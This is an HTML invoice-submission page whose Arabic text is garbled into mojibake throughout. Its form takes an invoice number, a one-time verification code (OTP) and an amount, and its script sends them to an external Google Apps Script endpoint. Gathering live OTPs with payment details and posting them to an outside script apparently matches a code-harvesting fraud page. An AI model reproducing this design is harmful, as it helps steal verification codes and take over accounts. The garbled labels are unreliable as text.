<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <title>ÿ•ÿ±ÿ≥ÿßŸÑ ŸÅÿßÿ™Ÿàÿ±ÿ©</title>
  <link rel="shortcut icon" href="img/try12.png" type="image/png" />
  <style>
    body {
      font-family: 'Arial', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f7f7f7;
      direction: rtl;
      text-align: right;
    }

    .container {
      max-width: 400px;
      margin: auto;
      padding: 20px;
      padding-top: 50px;
      background-color: white;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 10px;
    }

    h2 {
      text-align: center;
      color: #333;
      font-size: 20px;
    }

    input, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
    }

    button {
      background-color: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover:not(:disabled) {
      background-color: #45a049;
    }

    button:disabled {
      background-color: #999;
    }

    #response {
      margin-top: 15px;
      font-weight: bold;
      text-align: center;
    }

    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #4CAF50;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 15px auto;
      display: none;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @media (max-width: 480px) {
      .container {
        padding: 15px;
      }

      h2 {
        font-size: 18px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>üìã ÿ•ÿ±ÿ≥ÿßŸÑ ÿ®ŸäÿßŸÜÿßÿ™ </h2>
    <form id="invoiceForm">
      <input type="text" id="invoice" placeholder="ÿ±ŸÇŸÖ ÿßŸÑŸÅÿßÿ™Ÿàÿ±ÿ© (Invoice Num)" required>
      <input type="number" id="otp" placeholder="ÿ±ŸÖÿ≤ ÿßŸÑÿ™ÿ≠ŸÇŸÇ OTP" required>
      <input type="number" id="amount" placeholder="ÿßŸÑŸÖÿ®ŸÑÿ∫ (Amount)" required>
      <button type="submit">Send</button>
    </form>

    <div class="loader" id="loader"></div>
    <p id="response"></p>
  </div>

  <script>
    const form = document.getElementById('invoiceForm');
    const loader = document.getElementById('loader');
    const responseEl = document.getElementById('response');

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const invoice = document.getElementById('invoice').value;
      const otp = document.getElementById('otp').value;
      const amount = document.getElementById('amount').value;

      const now = new Date();
      const date = `${now.getDate().toString().padStart(2, '0')}/${(now.getMonth() + 1).toString().padStart(2, '0')}/${now.getFullYear()} ${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;

      loader.style.display = 'block';
      responseEl.textContent = '';
      form.querySelector('button').disabled = true;

      fetch('https://script.google.com/macros/s/AKfycbwhKESJ1fJ8-dSHyR_wUsH4QVzl7kY1nVBLiMiadSxcrzlnRqvYvzOOfhybzIUI0tWF/exec', {
        method: 'POST',
        mode: 'cors',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `invoice=${invoice}&otp=${otp}&amount=${amount}&date=${encodeURIComponent(date)}`
      })
      .then(() => {
        loader.style.display = 'none';
        responseEl.textContent = '‚úÖ Information Sent Successfully';
        responseEl.style.color = 'green';
        form.reset();
        form.querySelector('button').disabled = false;
      })
      .catch(() => {
        loader.style.display = 'none';
        responseEl.textContent = '‚ùå Error';
        responseEl.style.color = 'red';
        form.querySelector('button').disabled = false;
      });
    });
  </script>
</body>
</html>
